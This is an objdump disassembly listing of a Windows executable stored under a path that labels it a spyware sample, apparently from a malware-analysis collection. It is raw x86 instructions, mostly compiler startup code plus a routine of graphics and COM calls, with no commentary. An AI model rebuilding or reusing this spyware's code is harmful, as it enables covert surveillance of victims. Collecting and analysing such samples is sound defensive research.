
malware_samples/spyware/047a498cc9bf6793c9b9a8846e98a7c40d9a6bea70062e19d6a0dc21f1774511.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	51                   	push   %ecx
  401001:	ff 15 28 d1 40 00    	call   *0x40d128
  401007:	c3                   	ret
  401008:	cc                   	int3
  401009:	cc                   	int3
  40100a:	cc                   	int3
  40100b:	cc                   	int3
  40100c:	cc                   	int3
  40100d:	cc                   	int3
  40100e:	cc                   	int3
  40100f:	cc                   	int3
  401010:	53                   	push   %ebx
  401011:	8b dc                	mov    %esp,%ebx
  401013:	83 ec 08             	sub    $0x8,%esp
  401016:	83 e4 f8             	and    $0xfffffff8,%esp
  401019:	83 c4 04             	add    $0x4,%esp
  40101c:	55                   	push   %ebp
  40101d:	8b 6b 04             	mov    0x4(%ebx),%ebp
  401020:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  401024:	8b ec                	mov    %esp,%ebp
  401026:	6a ff                	push   $0xffffffff
  401028:	68 75 c1 40 00       	push   $0x40c175
  40102d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  401033:	50                   	push   %eax
  401034:	53                   	push   %ebx
  401035:	83 ec 38             	sub    $0x38,%esp
  401038:	56                   	push   %esi
  401039:	57                   	push   %edi
  40103a:	a1 00 40 41 00       	mov    0x414000,%eax
  40103f:	33 c5                	xor    %ebp,%eax
  401041:	50                   	push   %eax
  401042:	8d 45 f4             	lea    -0xc(%ebp),%eax
  401045:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  40104b:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  40104e:	8b f9                	mov    %ecx,%edi
  401050:	68 50 1d 41 00       	push   $0x411d50
  401055:	ff 73 08             	push   0x8(%ebx)
  401058:	57                   	push   %edi
  401059:	ff 15 18 d0 40 00    	call   *0x40d018
  40105f:	8b f0                	mov    %eax,%esi
  401061:	56                   	push   %esi
  401062:	57                   	push   %edi
  401063:	ff 15 14 d0 40 00    	call   *0x40d014
  401069:	50                   	push   %eax
  40106a:	ff 15 0c d0 40 00    	call   *0x40d00c
  401070:	56                   	push   %esi
  401071:	57                   	push   %edi
  401072:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401075:	ff 15 08 d0 40 00    	call   *0x40d008
  40107b:	8b f0                	mov    %eax,%esi
  40107d:	56                   	push   %esi
  40107e:	6a 00                	push   $0x0
  401080:	6a 11                	push   $0x11
  401082:	ff 15 20 d1 40 00    	call   *0x40d120
  401088:	8b f8                	mov    %eax,%edi
  40108a:	8d 45 e8             	lea    -0x18(%ebp),%eax
  40108d:	50                   	push   %eax
  40108e:	57                   	push   %edi
  40108f:	ff 15 2c d1 40 00    	call   *0x40d12c
  401095:	56                   	push   %esi
  401096:	ff 75 ec             	push   -0x14(%ebp)
  401099:	ff 75 e8             	push   -0x18(%ebp)
  40109c:	e8 8f 2a 00 00       	call   0x403b30
  4010a1:	83 c4 0c             	add    $0xc,%esp
  4010a4:	57                   	push   %edi
  4010a5:	ff 15 1c d1 40 00    	call   *0x40d11c
  4010ab:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4010ae:	8d 55 e0             	lea    -0x20(%ebp),%edx
  4010b1:	52                   	push   %edx
  4010b2:	57                   	push   %edi
  4010b3:	51                   	push   %ecx
  4010b4:	8b 01                	mov    (%ecx),%eax
  4010b6:	ff 90 b4 00 00 00    	call   *0xb4(%eax)
  4010bc:	57                   	push   %edi
  4010bd:	ff 15 24 d1 40 00    	call   *0x40d124
  4010c3:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4010c6:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4010c9:	52                   	push   %edx
  4010ca:	50                   	push   %eax
  4010cb:	8b 08                	mov    (%eax),%ecx
  4010cd:	ff 51 40             	call   *0x40(%ecx)
  4010d0:	6a 00                	push   $0x0
  4010d2:	6a 00                	push   $0x0
  4010d4:	6a 0c                	push   $0xc
  4010d6:	ff 15 20 d1 40 00    	call   *0x40d120
  4010dc:	8b 35 18 d1 40 00    	mov    0x40d118,%esi
  4010e2:	8b f8                	mov    %eax,%edi
  4010e4:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4010e7:	50                   	push   %eax
  4010e8:	ff d6                	call   *%esi
  4010ea:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4010ed:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4010f4:	50                   	push   %eax
  4010f5:	ff d6                	call   *%esi
  4010f7:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  4010fb:	8d 45 c8             	lea    -0x38(%ebp),%eax
  4010fe:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401101:	0f 10 45 b8          	movups -0x48(%ebp),%xmm0
  401105:	50                   	push   %eax
  401106:	57                   	push   %edi
  401107:	8b 11                	mov    (%ecx),%edx
  401109:	83 ec 10             	sub    $0x10,%esp
  40110c:	8b c4                	mov    %esp,%eax
  40110e:	51                   	push   %ecx
  40110f:	0f 11 00             	movups %xmm0,(%eax)
  401112:	ff 92 94 00 00 00    	call   *0x94(%edx)
  401118:	8b 35 28 d1 40 00    	mov    0x40d128,%esi
  40111e:	8d 45 c8             	lea    -0x38(%ebp),%eax
  401121:	50                   	push   %eax
  401122:	ff d6                	call   *%esi
  401124:	8d 45 b8             	lea    -0x48(%ebp),%eax
  401127:	50                   	push   %eax
  401128:	ff d6                	call   *%esi
  40112a:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40112d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401134:	59                   	pop    %ecx
  401135:	5f                   	pop    %edi
  401136:	5e                   	pop    %esi
  401137:	8b e5                	mov    %ebp,%esp
  401139:	5d                   	pop    %ebp
  40113a:	8b e3                	mov    %ebx,%esp
  40113c:	5b                   	pop    %ebx
  40113d:	c3                   	ret
  40113e:	cc                   	int3
  40113f:	cc                   	int3
  401140:	55                   	push   %ebp
  401141:	8b ec                	mov    %esp,%ebp
  401143:	83 e4 f8             	and    $0xfffffff8,%esp
  401146:	83 ec 14             	sub    $0x14,%esp
  401149:	56                   	push   %esi
  40114a:	8b 35 10 d0 40 00    	mov    0x40d010,%esi
  401150:	68 5c 1d 41 00       	push   $0x411d5c
  401155:	ff d6                	call   *%esi
  401157:	68 70 1d 41 00       	push   $0x411d70
  40115c:	50                   	push   %eax
  40115d:	ff 15 1c d0 40 00    	call   *0x40d01c
  401163:	85 c0                	test   %eax,%eax
  401165:	74 07                	je     0x40116e
  401167:	68 00 08 00 00       	push   $0x800
  40116c:	ff d0                	call   *%eax
  40116e:	68 8c 1d 41 00       	push   $0x411d8c
  401173:	ff d6                	call   *%esi
  401175:	68 a4 1d 41 00       	push   $0x411da4
  40117a:	50                   	push   %eax
  40117b:	ff 15 1c d0 40 00    	call   *0x40d01c
  401181:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  401188:	00 
  401189:	85 c0                	test   %eax,%eax
  40118b:	74 5b                	je     0x4011e8
  40118d:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401191:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  401198:	00 
  401199:	51                   	push   %ecx
  40119a:	68 2c 1e 41 00       	push   $0x411e2c
  40119f:	68 3c 1e 41 00       	push   $0x411e3c
  4011a4:	ff d0                	call   *%eax
  4011a6:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4011aa:	85 c9                	test   %ecx,%ecx
  4011ac:	74 32                	je     0x4011e0
  4011ae:	8b 01                	mov    (%ecx),%eax
  4011b0:	8d 54 24 10          	lea    0x10(%esp),%edx
  4011b4:	52                   	push   %edx
  4011b5:	68 4c 1e 41 00       	push   $0x411e4c
  4011ba:	68 b8 1d 41 00       	push   $0x411db8
  4011bf:	51                   	push   %ecx
  4011c0:	ff 50 0c             	call   *0xc(%eax)
  4011c3:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4011c7:	85 c9                	test   %ecx,%ecx
  4011c9:	74 15                	je     0x4011e0
  4011cb:	8b 01                	mov    (%ecx),%eax
  4011cd:	8d 54 24 04          	lea    0x4(%esp),%edx
  4011d1:	52                   	push   %edx
  4011d2:	68 fc 1d 41 00       	push   $0x411dfc
  4011d7:	68 1c 1e 41 00       	push   $0x411e1c
  4011dc:	51                   	push   %ecx
  4011dd:	ff 50 24             	call   *0x24(%eax)
  4011e0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4011e4:	85 c9                	test   %ecx,%ecx
  4011e6:	75 1f                	jne    0x401207
  4011e8:	8d 44 24 04          	lea    0x4(%esp),%eax
  4011ec:	50                   	push   %eax
  4011ed:	68 fc 1d 41 00       	push   $0x411dfc
  4011f2:	68 1c 1e 41 00       	push   $0x411e1c
  4011f7:	6a 00                	push   $0x0
  4011f9:	6a 00                	push   $0x0
  4011fb:	6a 00                	push   $0x0
  4011fd:	ff 15 34 d1 40 00    	call   *0x40d134
  401203:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401207:	8b 01                	mov    (%ecx),%eax
  401209:	51                   	push   %ecx
  40120a:	ff 50 28             	call   *0x28(%eax)
  40120d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401211:	8d 54 24 14          	lea    0x14(%esp),%edx
  401215:	52                   	push   %edx
  401216:	50                   	push   %eax
  401217:	8b 08                	mov    (%eax),%ecx
  401219:	ff 51 34             	call   *0x34(%ecx)
  40121c:	8b 44 24 14          	mov    0x14(%esp),%eax
  401220:	8d 54 24 0c          	lea    0xc(%esp),%edx
  401224:	52                   	push   %edx
  401225:	68 0c 1e 41 00       	push   $0x411e0c
  40122a:	50                   	push   %eax
  40122b:	8b 08                	mov    (%eax),%ecx
  40122d:	ff 11                	call   *(%ecx)
  40122f:	8b 54 24 0c          	mov    0xc(%esp),%edx
  401233:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401236:	68 d0 1d 41 00       	push   $0x411dd0
  40123b:	e8 d0 fd ff ff       	call   0x401010
  401240:	8b 54 24 10          	mov    0x10(%esp),%edx
  401244:	83 c4 04             	add    $0x4,%esp
  401247:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40124a:	68 e4 1d 41 00       	push   $0x411de4
  40124f:	e8 bc fd ff ff       	call   0x401010
  401254:	83 c4 04             	add    $0x4,%esp
  401257:	5e                   	pop    %esi
  401258:	8b e5                	mov    %ebp,%esp
  40125a:	5d                   	pop    %ebp
  40125b:	c2 10 00             	ret    $0x10
  40125e:	3b 0d 00 40 41 00    	cmp    0x414000,%ecx
  401264:	75 01                	jne    0x401267
  401266:	c3                   	ret
  401267:	e9 73 02 00 00       	jmp    0x4014df
  40126c:	56                   	push   %esi
  40126d:	6a 02                	push   $0x2
  40126f:	e8 f5 2f 00 00       	call   0x404269
  401274:	e8 50 06 00 00       	call   0x4018c9
  401279:	50                   	push   %eax
  40127a:	e8 78 39 00 00       	call   0x404bf7
  40127f:	e8 3e 06 00 00       	call   0x4018c2
  401284:	8b f0                	mov    %eax,%esi
  401286:	e8 9d 3a 00 00       	call   0x404d28
  40128b:	6a 01                	push   $0x1
  40128d:	89 30                	mov    %esi,(%eax)
  40128f:	e8 f4 03 00 00       	call   0x401688
  401294:	83 c4 0c             	add    $0xc,%esp
  401297:	5e                   	pop    %esi
  401298:	84 c0                	test   %al,%al
  40129a:	74 73                	je     0x40130f
  40129c:	db e2                	fnclex
  40129e:	e8 9d 08 00 00       	call   0x401b40
  4012a3:	68 6c 1b 40 00       	push   $0x401b6c
  4012a8:	e8 68 05 00 00       	call   0x401815
  4012ad:	e8 13 06 00 00       	call   0x4018c5
  4012b2:	50                   	push   %eax
  4012b3:	e8 89 33 00 00       	call   0x404641
  4012b8:	59                   	pop    %ecx
  4012b9:	59                   	pop    %ecx
  4012ba:	85 c0                	test   %eax,%eax
  4012bc:	75 51                	jne    0x40130f
  4012be:	e8 0c 06 00 00       	call   0x4018cf
  4012c3:	e8 63 06 00 00       	call   0x40192b
  4012c8:	85 c0                	test   %eax,%eax
  4012ca:	74 0b                	je     0x4012d7
  4012cc:	68 c2 18 40 00       	push   $0x4018c2
  4012d1:	e8 68 30 00 00       	call   0x40433e
  4012d6:	59                   	pop    %ecx
  4012d7:	e8 23 06 00 00       	call   0x4018ff
  4012dc:	e8 1e 06 00 00       	call   0x4018ff
  4012e1:	e8 f8 05 00 00       	call   0x4018de
  4012e6:	e8 d7 05 00 00       	call   0x4018c2
  4012eb:	50                   	push   %eax
  4012ec:	e8 a0 39 00 00       	call   0x404c91
  4012f1:	59                   	pop    %ecx
  4012f2:	e8 e4 05 00 00       	call   0x4018db
  4012f7:	84 c0                	test   %al,%al
  4012f9:	74 05                	je     0x401300
  4012fb:	e8 52 35 00 00       	call   0x404852
  401300:	e8 bd 05 00 00       	call   0x4018c2
  401305:	e8 85 07 00 00       	call   0x401a8f
  40130a:	85 c0                	test   %eax,%eax
  40130c:	75 01                	jne    0x40130f
  40130e:	c3                   	ret
  40130f:	6a 07                	push   $0x7
  401311:	e8 2d 06 00 00       	call   0x401943
  401316:	cc                   	int3
  401317:	e8 f2 05 00 00       	call   0x40190e
  40131c:	33 c0                	xor    %eax,%eax
  40131e:	c3                   	ret
  40131f:	e8 b2 07 00 00       	call   0x401ad6
  401324:	e8 99 05 00 00       	call   0x4018c2
  401329:	50                   	push   %eax
  40132a:	e8 ca 39 00 00       	call   0x404cf9
  40132f:	59                   	pop    %ecx
  401330:	c3                   	ret
  401331:	6a 14                	push   $0x14
  401333:	68 00 25 41 00       	push   $0x412500
  401338:	e8 63 08 00 00       	call   0x401ba0
  40133d:	6a 01                	push   $0x1
  40133f:	e8 0b 03 00 00       	call   0x40164f
  401344:	59                   	pop    %ecx
  401345:	84 c0                	test   %al,%al
  401347:	0f 84 4a 01 00 00    	je     0x401497
  40134d:	32 db                	xor    %bl,%bl
  40134f:	88 5d e7             	mov    %bl,-0x19(%ebp)
  401352:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  401356:	e8 c2 02 00 00       	call   0x40161d
  40135b:	88 45 dc             	mov    %al,-0x24(%ebp)
  40135e:	a1 f4 4a 41 00       	mov    0x414af4,%eax
  401363:	33 c9                	xor    %ecx,%ecx
  401365:	41                   	inc    %ecx
  401366:	3b c1                	cmp    %ecx,%eax
  401368:	0f 84 29 01 00 00    	je     0x401497
  40136e:	85 c0                	test   %eax,%eax
  401370:	75 49                	jne    0x4013bb
  401372:	89 0d f4 4a 41 00    	mov    %ecx,0x414af4
  401378:	68 68 d1 40 00       	push   $0x40d168
  40137d:	68 50 d1 40 00       	push   $0x40d150
  401382:	e8 7f 35 00 00       	call   0x404906
  401387:	59                   	pop    %ecx
  401388:	59                   	pop    %ecx
  401389:	85 c0                	test   %eax,%eax
  40138b:	74 11                	je     0x40139e
  40138d:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  401394:	b8 ff 00 00 00       	mov    $0xff,%eax
  401399:	e9 e9 00 00 00       	jmp    0x401487
  40139e:	68 4c d1 40 00       	push   $0x40d14c
  4013a3:	68 44 d1 40 00       	push   $0x40d144
  4013a8:	e8 fd 34 00 00       	call   0x4048aa
  4013ad:	59                   	pop    %ecx
  4013ae:	59                   	pop    %ecx
  4013af:	c7 05 f4 4a 41 00 02 	movl   $0x2,0x414af4
  4013b6:	00 00 00 
  4013b9:	eb 05                	jmp    0x4013c0
  4013bb:	8a d9                	mov    %cl,%bl
  4013bd:	88 5d e7             	mov    %bl,-0x19(%ebp)
  4013c0:	ff 75 dc             	push   -0x24(%ebp)
  4013c3:	e8 db 03 00 00       	call   0x4017a3
  4013c8:	59                   	pop    %ecx
  4013c9:	e8 69 05 00 00       	call   0x401937
  4013ce:	8b f0                	mov    %eax,%esi
  4013d0:	33 ff                	xor    %edi,%edi
  4013d2:	39 3e                	cmp    %edi,(%esi)
  4013d4:	74 1b                	je     0x4013f1
  4013d6:	56                   	push   %esi
  4013d7:	e8 33 03 00 00       	call   0x40170f
  4013dc:	59                   	pop    %ecx
  4013dd:	84 c0                	test   %al,%al
  4013df:	74 10                	je     0x4013f1
  4013e1:	8b 36                	mov    (%esi),%esi
  4013e3:	57                   	push   %edi
  4013e4:	6a 02                	push   $0x2
  4013e6:	57                   	push   %edi
  4013e7:	8b ce                	mov    %esi,%ecx
  4013e9:	ff 15 3c d1 40 00    	call   *0x40d13c
  4013ef:	ff d6                	call   *%esi
  4013f1:	e8 47 05 00 00       	call   0x40193d
  4013f6:	8b f0                	mov    %eax,%esi
  4013f8:	39 3e                	cmp    %edi,(%esi)
  4013fa:	74 13                	je     0x40140f
  4013fc:	56                   	push   %esi
  4013fd:	e8 0d 03 00 00       	call   0x40170f
  401402:	59                   	pop    %ecx
  401403:	84 c0                	test   %al,%al
  401405:	74 08                	je     0x40140f
  401407:	ff 36                	push   (%esi)
  401409:	e8 9b 37 00 00       	call   0x404ba9
  40140e:	59                   	pop    %ecx
  40140f:	e8 4a 06 00 00       	call   0x401a5e
  401414:	0f b7 f0             	movzwl %ax,%esi
  401417:	e8 3b 34 00 00       	call   0x404857
  40141c:	56                   	push   %esi
  40141d:	50                   	push   %eax
  40141e:	57                   	push   %edi
  40141f:	68 00 00 40 00       	push   $0x400000
  401424:	e8 17 fd ff ff       	call   0x401140
  401429:	8b f0                	mov    %eax,%esi
  40142b:	e8 64 06 00 00       	call   0x401a94
  401430:	84 c0                	test   %al,%al
  401432:	74 6a                	je     0x40149e
  401434:	84 db                	test   %bl,%bl
  401436:	75 05                	jne    0x40143d
  401438:	e8 47 37 00 00       	call   0x404b84
  40143d:	57                   	push   %edi
  40143e:	6a 01                	push   $0x1
  401440:	e8 7b 03 00 00       	call   0x4017c0
  401445:	59                   	pop    %ecx
  401446:	59                   	pop    %ecx
  401447:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  40144e:	8b c6                	mov    %esi,%eax
  401450:	eb 35                	jmp    0x401487
  401452:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401455:	8b 01                	mov    (%ecx),%eax
  401457:	8b 00                	mov    (%eax),%eax
  401459:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40145c:	51                   	push   %ecx
  40145d:	50                   	push   %eax
  40145e:	e8 8d 2c 00 00       	call   0x4040f0
  401463:	59                   	pop    %ecx
  401464:	59                   	pop    %ecx
  401465:	c3                   	ret
  401466:	8b 65 e8             	mov    -0x18(%ebp),%esp
  401469:	e8 26 06 00 00       	call   0x401a94
  40146e:	84 c0                	test   %al,%al
  401470:	74 32                	je     0x4014a4
  401472:	80 7d e7 00          	cmpb   $0x0,-0x19(%ebp)
  401476:	75 05                	jne    0x40147d
  401478:	e8 f8 36 00 00       	call   0x404b75
  40147d:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  401484:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401487:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40148a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401491:	59                   	pop    %ecx
  401492:	5f                   	pop    %edi
  401493:	5e                   	pop    %esi
  401494:	5b                   	pop    %ebx
  401495:	c9                   	leave
  401496:	c3                   	ret
  401497:	6a 07                	push   $0x7
  401499:	e8 a5 04 00 00       	call   0x401943
  40149e:	56                   	push   %esi
  40149f:	e8 3d 37 00 00       	call   0x404be1
  4014a4:	ff 75 e0             	push   -0x20(%ebp)
  4014a7:	e8 e7 36 00 00       	call   0x404b93
  4014ac:	cc                   	int3
  4014ad:	e8 c5 03 00 00       	call   0x401877
  4014b2:	e9 7a fe ff ff       	jmp    0x401331
  4014b7:	55                   	push   %ebp
  4014b8:	8b ec                	mov    %esp,%ebp
  4014ba:	6a 00                	push   $0x0
  4014bc:	ff 15 40 d0 40 00    	call   *0x40d040
  4014c2:	ff 75 08             	push   0x8(%ebp)
  4014c5:	ff 15 3c d0 40 00    	call   *0x40d03c
  4014cb:	68 09 04 00 c0       	push   $0xc0000409
  4014d0:	ff 15 44 d0 40 00    	call   *0x40d044
  4014d6:	50                   	push   %eax
  4014d7:	ff 15 48 d0 40 00    	call   *0x40d048
  4014dd:	5d                   	pop    %ebp
  4014de:	c3                   	ret
  4014df:	55                   	push   %ebp
  4014e0:	8b ec                	mov    %esp,%ebp
  4014e2:	81 ec 24 03 00 00    	sub    $0x324,%esp
  4014e8:	6a 17                	push   $0x17
  4014ea:	ff 15 4c d0 40 00    	call   *0x40d04c
  4014f0:	85 c0                	test   %eax,%eax
  4014f2:	74 05                	je     0x4014f9
  4014f4:	6a 02                	push   $0x2
  4014f6:	59                   	pop    %ecx
  4014f7:	cd 29                	int    $0x29
  4014f9:	a3 d8 48 41 00       	mov    %eax,0x4148d8
  4014fe:	89 0d d4 48 41 00    	mov    %ecx,0x4148d4
  401504:	89 15 d0 48 41 00    	mov    %edx,0x4148d0
  40150a:	89 1d cc 48 41 00    	mov    %ebx,0x4148cc
  401510:	89 35 c8 48 41 00    	mov    %esi,0x4148c8
  401516:	89 3d c4 48 41 00    	mov    %edi,0x4148c4
  40151c:	66 8c 15 f0 48 41 00 	data16 mov %ss,0x4148f0
  401523:	66 8c 0d e4 48 41 00 	data16 mov %cs,0x4148e4
  40152a:	66 8c 1d c0 48 41 00 	data16 mov %ds,0x4148c0
  401531:	66 8c 05 bc 48 41 00 	data16 mov %es,0x4148bc
  401538:	66 8c 25 b8 48 41 00 	data16 mov %fs,0x4148b8
  40153f:	66 8c 2d b4 48 41 00 	data16 mov %gs,0x4148b4
  401546:	9c                   	pushf
  401547:	8f 05 e8 48 41 00    	pop    0x4148e8
  40154d:	8b 45 00             	mov    0x0(%ebp),%eax
  401550:	a3 dc 48 41 00       	mov    %eax,0x4148dc
  401555:	8b 45 04             	mov    0x4(%ebp),%eax
  401558:	a3 e0 48 41 00       	mov    %eax,0x4148e0
  40155d:	8d 45 08             	lea    0x8(%ebp),%eax
  401560:	a3 ec 48 41 00       	mov    %eax,0x4148ec
  401565:	8b 85 dc fc ff ff    	mov    -0x324(%ebp),%eax
  40156b:	c7 05 28 48 41 00 01 	movl   $0x10001,0x414828
  401572:	00 01 00 
  401575:	a1 e0 48 41 00       	mov    0x4148e0,%eax
  40157a:	a3 e4 47 41 00       	mov    %eax,0x4147e4
  40157f:	c7 05 d8 47 41 00 09 	movl   $0xc0000409,0x4147d8
  401586:	04 00 c0 
  401589:	c7 05 dc 47 41 00 01 	movl   $0x1,0x4147dc
  401590:	00 00 00 
  401593:	c7 05 e8 47 41 00 01 	movl   $0x1,0x4147e8
  40159a:	00 00 00 
  40159d:	6a 04                	push   $0x4
  40159f:	58                   	pop    %eax
  4015a0:	6b c0 00             	imul   $0x0,%eax,%eax
  4015a3:	c7 80 ec 47 41 00 02 	movl   $0x2,0x4147ec(%eax)
  4015aa:	00 00 00 
  4015ad:	6a 04                	push   $0x4
  4015af:	58                   	pop    %eax
  4015b0:	6b c0 00             	imul   $0x0,%eax,%eax
  4015b3:	8b 0d 00 40 41 00    	mov    0x414000,%ecx
  4015b9:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  4015bd:	6a 04                	push   $0x4
  4015bf:	58                   	pop    %eax
  4015c0:	c1 e0 00             	shl    $0x0,%eax
  4015c3:	8b 0d 04 40 41 00    	mov    0x414004,%ecx
  4015c9:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  4015cd:	68 90 d1 40 00       	push   $0x40d190
  4015d2:	e8 e0 fe ff ff       	call   0x4014b7
  4015d7:	c9                   	leave
  4015d8:	c3                   	ret
  4015d9:	55                   	push   %ebp
  4015da:	8b ec                	mov    %esp,%ebp
  4015dc:	8b 45 08             	mov    0x8(%ebp),%eax
  4015df:	56                   	push   %esi
  4015e0:	8b 48 3c             	mov    0x3c(%eax),%ecx
  4015e3:	03 c8                	add    %eax,%ecx
  4015e5:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  4015e9:	8d 51 18             	lea    0x18(%ecx),%edx
  4015ec:	03 d0                	add    %eax,%edx
  4015ee:	0f b7 41 06          	movzwl 0x6(%ecx),%eax
  4015f2:	6b f0 28             	imul   $0x28,%eax,%esi
  4015f5:	03 f2                	add    %edx,%esi
  4015f7:	3b d6                	cmp    %esi,%edx
  4015f9:	74 19                	je     0x401614
  4015fb:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4015fe:	3b 4a 0c             	cmp    0xc(%edx),%ecx
  401601:	72 0a                	jb     0x40160d
  401603:	8b 42 08             	mov    0x8(%edx),%eax
  401606:	03 42 0c             	add    0xc(%edx),%eax
  401609:	3b c8                	cmp    %eax,%ecx
  40160b:	72 0c                	jb     0x401619
  40160d:	83 c2 28             	add    $0x28,%edx
  401610:	3b d6                	cmp    %esi,%edx
  401612:	75 ea                	jne    0x4015fe
  401614:	33 c0                	xor    %eax,%eax
  401616:	5e                   	pop    %esi
  401617:	5d                   	pop    %ebp
  401618:	c3                   	ret
  401619:	8b c2                	mov    %edx,%eax
  40161b:	eb f9                	jmp    0x401616
  40161d:	56                   	push   %esi
  40161e:	e8 b5 07 00 00       	call   0x401dd8
  401623:	85 c0                	test   %eax,%eax
  401625:	74 20                	je     0x401647
  401627:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  40162d:	be f8 4a 41 00       	mov    $0x414af8,%esi
  401632:	8b 50 04             	mov    0x4(%eax),%edx
  401635:	eb 04                	jmp    0x40163b
  401637:	3b d0                	cmp    %eax,%edx
  401639:	74 10                	je     0x40164b
  40163b:	33 c0                	xor    %eax,%eax
  40163d:	8b ca                	mov    %edx,%ecx
  40163f:	f0 0f b1 0e          	lock cmpxchg %ecx,(%esi)
  401643:	85 c0                	test   %eax,%eax
  401645:	75 f0                	jne    0x401637
  401647:	32 c0                	xor    %al,%al
  401649:	5e                   	pop    %esi
  40164a:	c3                   	ret
  40164b:	b0 01                	mov    $0x1,%al
  40164d:	5e                   	pop    %esi
  40164e:	c3                   	ret
  40164f:	55                   	push   %ebp
  401650:	8b ec                	mov    %esp,%ebp
  401652:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  401656:	75 07                	jne    0x40165f
  401658:	c6 05 fc 4a 41 00 01 	movb   $0x1,0x414afc
  40165f:	e8 a0 05 00 00       	call   0x401c04
  401664:	e8 d5 0c 00 00       	call   0x40233e
  401669:	84 c0                	test   %al,%al
  40166b:	75 04                	jne    0x401671
  40166d:	32 c0                	xor    %al,%al
  40166f:	5d                   	pop    %ebp
  401670:	c3                   	ret
  401671:	e8 90 3b 00 00       	call   0x405206
  401676:	84 c0                	test   %al,%al
  401678:	75 0a                	jne    0x401684
  40167a:	6a 00                	push   $0x0
  40167c:	e8 dc 0c 00 00       	call   0x40235d
  401681:	59                   	pop    %ecx
  401682:	eb e9                	jmp    0x40166d
  401684:	b0 01                	mov    $0x1,%al
  401686:	5d                   	pop    %ebp
  401687:	c3                   	ret
  401688:	55                   	push   %ebp
  401689:	8b ec                	mov    %esp,%ebp
  40168b:	80 3d fd 4a 41 00 00 	cmpb   $0x0,0x414afd
  401692:	74 04                	je     0x401698
  401694:	b0 01                	mov    $0x1,%al
  401696:	5d                   	pop    %ebp
  401697:	c3                   	ret
  401698:	56                   	push   %esi
  401699:	8b 75 08             	mov    0x8(%ebp),%esi
  40169c:	85 f6                	test   %esi,%esi
  40169e:	74 05                	je     0x4016a5
  4016a0:	83 fe 01             	cmp    $0x1,%esi
  4016a3:	75 62                	jne    0x401707
  4016a5:	e8 2e 07 00 00       	call   0x401dd8
  4016aa:	85 c0                	test   %eax,%eax
  4016ac:	74 26                	je     0x4016d4
  4016ae:	85 f6                	test   %esi,%esi
  4016b0:	75 22                	jne    0x4016d4
  4016b2:	68 00 4b 41 00       	push   $0x414b00
  4016b7:	e8 f8 39 00 00       	call   0x4050b4
  4016bc:	59                   	pop    %ecx
  4016bd:	85 c0                	test   %eax,%eax
  4016bf:	75 0f                	jne    0x4016d0
  4016c1:	68 0c 4b 41 00       	push   $0x414b0c
  4016c6:	e8 e9 39 00 00       	call   0x4050b4
  4016cb:	59                   	pop    %ecx
  4016cc:	85 c0                	test   %eax,%eax
  4016ce:	74 2b                	je     0x4016fb
  4016d0:	32 c0                	xor    %al,%al
  4016d2:	eb 30                	jmp    0x401704
  4016d4:	83 c9 ff             	or     $0xffffffff,%ecx
  4016d7:	89 0d 00 4b 41 00    	mov    %ecx,0x414b00
  4016dd:	89 0d 04 4b 41 00    	mov    %ecx,0x414b04
  4016e3:	89 0d 08 4b 41 00    	mov    %ecx,0x414b08
  4016e9:	89 0d 0c 4b 41 00    	mov    %ecx,0x414b0c
  4016ef:	89 0d 10 4b 41 00    	mov    %ecx,0x414b10
  4016f5:	89 0d 14 4b 41 00    	mov    %ecx,0x414b14
  4016fb:	c6 05 fd 4a 41 00 01 	movb   $0x1,0x414afd
  401702:	b0 01                	mov    $0x1,%al
  401704:	5e                   	pop    %esi
  401705:	5d                   	pop    %ebp
  401706:	c3                   	ret
  401707:	6a 05                	push   $0x5
  401709:	e8 35 02 00 00       	call   0x401943
  40170e:	cc                   	int3
  40170f:	6a 08                	push   $0x8
  401711:	68 20 25 41 00       	push   $0x412520
  401716:	e8 85 04 00 00       	call   0x401ba0
  40171b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40171f:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  401724:	66 39 05 00 00 40 00 	cmp    %ax,0x400000
  40172b:	75 5d                	jne    0x40178a
  40172d:	a1 3c 00 40 00       	mov    0x40003c,%eax
  401732:	81 b8 00 00 40 00 50 	cmpl   $0x4550,0x400000(%eax)
  401739:	45 00 00 
  40173c:	75 4c                	jne    0x40178a
